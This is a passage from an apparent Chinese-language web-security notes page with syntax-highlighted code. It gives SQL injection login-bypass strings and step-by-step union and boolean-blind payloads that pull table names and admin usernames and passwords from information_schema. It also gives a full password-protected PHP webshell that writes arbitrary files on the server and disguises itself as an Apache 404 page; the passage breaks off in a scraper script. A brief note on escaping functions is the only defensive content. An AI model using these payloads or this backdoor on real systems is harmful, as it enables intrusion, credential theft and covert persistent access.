class="token punctuation">.</span><span class="token variable">$v</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h1><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><pre class="line-numbers language-mysql"><code class="language-mysql">select 1,2,3select user_name from studnet where id = 1#注释1-- 注释2，--空格/*    注释3 多行注释*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PHP登录模板</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select * from student where user_name=$name and password=$passwd"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方式1：利用注释闭合SQL语句"><a href="#方式1：利用注释闭合SQL语句" class="headerlink" title="方式1：利用注释闭合SQL语句"></a>方式1：利用注释闭合SQL语句</h3><p>1.<code>'or'='or'</code></p><p>2.<code>xxx' or 1 ; -- xixi</code></p><p>有的时候会用<code>trim</code>把输入的参数中的空格过滤掉。</p><p>3.<code>xxx or 1 ###</code></p><p>4.<code>' or 1=1 ####'</code></p><p>5.<code>Pass: ' or '1' = '1</code></p><h3 id="方式2：利用截断绕过"><a href="#方式2：利用截断绕过" class="headerlink" title="方式2：利用截断绕过"></a>方式2：利用截断绕过</h3><p>1.<code>user_name = 'or 1=1 ; %00/*&amp;user_pass=111'</code></p><p>2.<code>user_name='or 1=1; %001111&amp;user_pass=111'</code></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p><code>addslashes</code></p><p> 使用反斜线引用字符串</p><p><code>mysqli_real_escape_string</code></p><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="①联合注入"><a href="#①联合注入" class="headerlink" title="①联合注入"></a>①联合注入</h3><h4 id="1、查找注入点"><a href="#1、查找注入点" class="headerlink" title="1、查找注入点"></a>1、查找注入点</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//搜索框一般的sql语句</span><span class="token variable">$sql_comment</span> <span class="token operator">=</span> <span class="token string">"select * from comment where text like '%$search%' order by comment_id"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//闭合</span><span class="token string">"select * from comment where text like '%  xixi%' -- d    %' order by comment_id"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//能搜到</span><span class="token string">"select * from comment where text like '%  xixi% -- d    %' order by comment_id"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//搜不到</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、使用order-by-测试字段数，查找输出点"><a href="#2、使用order-by-测试字段数，查找输出点" class="headerlink" title="2、使用order by 测试字段数，查找输出点"></a>2、使用order by 测试字段数，查找输出点</h4><pre class="line-numbers language-sql"><code class="language-sql">xx<span class="token operator">%</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> N <span class="token comment" spellcheck="true">-- d</span>xx<span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token comment" spellcheck="true">-- d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3、查找信息常用函数"><a href="#3、查找信息常用函数" class="headerlink" title="3、查找信息常用函数"></a>3、查找信息常用函数</h4><pre class="line-numbers language-sql"><code class="language-sql">@<span class="token variable">@datadir</span> 函数    作用：返回数据库的存储目录    构造SQL语句 <span class="token keyword">select</span> @<span class="token variable">@datadir</span><span class="token punctuation">;</span>    @<span class="token variable">@version_compile_os</span> 函数    作用：查看服务器的操作系统    SQL语句：<span class="token keyword">select</span> @<span class="token variable">@version_compile_os</span><span class="token punctuation">;</span>    <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数    作用：查看当前连接的数据库名称    SQL语句：<span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数    作用：查看当前连接数据库的用户    SQL语句：<span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    version<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数     作用：查看数据库的版本     SQL语句：<span class="token keyword">select</span> versionconcat<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span> 函数    作用：连接两个字符串并传入数据库 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4、查找表名"><a href="#4、查找表名" class="headerlink" title="4、查找表名"></a>4、查找表名</h4><pre class="line-numbers language-sql"><code class="language-sql">xxx<span class="token operator">%</span><span class="token string">' and 1=2 union select 1,count(*),3,4 from information_schema.TABLES where TABLE_SCHEMA='</span>test_message'<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">-- s</span><span class="token comment" spellcheck="true">#绕过单引号，使用十六进制</span>xxx<span class="token operator">%</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">TABLES</span> <span class="token keyword">where</span> TABLE_SCHEMA<span class="token operator">=</span><span class="token number">0x746573745f6d657373616765</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">-- s</span><span class="token comment" spellcheck="true">#使用limit 限制输出语句</span>xxx<span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span> TABLE_NAME <span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">TABLES</span> <span class="token keyword">where</span> TABLE_SCHEMA<span class="token operator">=</span><span class="token number">0x746573745f6d657373616765</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token comment" spellcheck="true">-- s</span><span class="token comment" spellcheck="true">#使用concat输出</span>xxx<span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span> CONCAT<span class="token punctuation">(</span>TABLE_NAME<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">TABLES</span> <span class="token keyword">where</span> TABLE_SCHEMA<span class="token operator">=</span><span class="token number">0x746573745f6d657373616765</span>  <span class="token comment" spellcheck="true">-- s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5、查找字段值"><a href="#5、查找字段值" class="headerlink" title="5、查找字段值"></a>5、查找字段值</h4><pre class="line-numbers language-sql"><code class="language-sql">xxx<span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>COLUMN_NAME<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">COLUMNS</span> <span class="token keyword">where</span> TABLE_NAME<span class="token operator">=</span><span class="token number">0x61646d696e</span>  <span class="token comment" spellcheck="true">-- s </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6、查找密码"><a href="#6、查找密码" class="headerlink" title="6、查找密码"></a>6、查找密码</h4><pre class="line-numbers language-sql"><code class="language-sql">xxx<span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>admin_username<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>admin_password<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> admin  <span class="token comment" spellcheck="true">-- s  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="②布尔注入"><a href="#②布尔注入" class="headerlink" title="②布尔注入"></a>②布尔注入</h3><h4 id="1-查看长度length"><a href="#1-查看长度length" class="headerlink" title="1.查看长度length"></a>1.查看长度length</h4><pre class="line-numbers language-sql"><code class="language-sql">search<span class="token operator">=</span> xixi<span class="token operator">%</span> '<span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span> §<span class="token number">a</span>§<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">-- s</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-爆破每个数据"><a href="#2-爆破每个数据" class="headerlink" title="2.爆破每个数据"></a>2.爆破每个数据</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># 要吧and后面的 select 包起来</span>search<span class="token operator">=</span>xixi<span class="token operator">%</span><span class="token string">' and (SELECT (SELECT MID(DATABASE(),1,1) ='</span>t'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">-- s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="二、木马分析"><a href="#二、木马分析" class="headerlink" title="二、木马分析"></a>二、木马分析</h1><h2 id="1-文件的写入"><a href="#1-文件的写入" class="headerlink" title="1.文件的写入"></a>1.文件的写入</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"xxx.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"hello,world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-PHP小马"><a href="#2-PHP小马" class="headerlink" title="2.PHP小马"></a>2.PHP小马</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token number">404</span> Not Found<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Title<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>    <span class="token shell-comment comment">#filepath{</span>        width<span class="token punctuation">:</span> 400px<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment">#fileContext{</span>        width<span class="token punctuation">:</span> 500px<span class="token punctuation">;</span>        height<span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type:text/html;charset=utf-8)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * Create by jackliu */</span><span class="token comment" spellcheck="true">//var_dump($_SERVER);</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token string">"14e1b600b1fd579f47433b88e8d85291"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pass</span> <span class="token operator">===</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//right</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$path</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filepath'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件路径</span>            <span class="token variable">$context</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'fileContext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件内容</span>            <span class="token variable">$fd</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$count</span><span class="token operator">=</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">,</span><span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//写入文件，返回的是写入文件的字符个数</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"success"</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>&lt;mark>"</span><span class="token punctuation">.</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token string">"&lt;/mark>&lt;br/>"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"faild"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token delimiter">?></span>    <span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Title<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    服务器<span class="token constant">IP</span>及当前域名<span class="token punctuation">:</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"("</span><span class="token punctuation">.</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token string">")"</span> <span class="token delimiter">?></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>    当前页面的绝对路径<span class="token punctuation">:</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>    当前页面的绝对目录<span class="token punctuation">:</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token constant">__DIR__</span> <span class="token delimiter">?></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>        输入文件路径<span class="token punctuation">:</span> <span class="token markup">&lt;input type="text" name="filepath" id="filepath" value="<span class="token prolog">&lt;?php echo __DIR__."\\1.php" ?></span></span>"<span class="token operator">></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>写入数据<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fileContext<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fileContext<span class="token punctuation">"</span></span> <span class="token attr-name">"</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>     <span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token delimiter">?></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Not Found<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>The requested <span class="token constant">URL</span> <span class="token delimiter">&lt;?php</span> <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$pos</span><span class="token punctuation">)</span> <span class="token delimiter">?></span> was not found on this server<span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>address</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">]</span><span class="token delimiter">?></span> Server at <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token delimiter">?></span> Port <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_PORT'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>address</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//var_dump($_SERVER);</span>    <span class="token delimiter">?></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Not Found<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>The requested <span class="token constant">URL</span> <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token delimiter">?></span> was not found on this server<span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>address</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">]</span><span class="token delimiter">?></span> Server at <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token delimiter">?></span> Port <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_PORT'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>address</span><span class="token punctuation">></span></span></span>    <span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-PHP采集工具"><a href="#3-PHP采集工具" class="headerlink" title="3.PHP采集工具"></a>3.PHP采集工具</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** * Create by jackliu */</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string">"/&lt;div class=\"title\">&lt;span class=\"middle-tag f12 font-normal color-fff yellow-tag\">(.*?)&lt;\/span>(.*?)&lt;\/div>/"</span><span class="token punctuation">;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token string">"$res"</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$count</span> <span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"第"</span><span class="token punctuation">.</span><span class="token variable">$s</span><span class="token operator">++</span><span class="token punctuation">.</span><span class="token string">"条数据是:"</span><span class="token 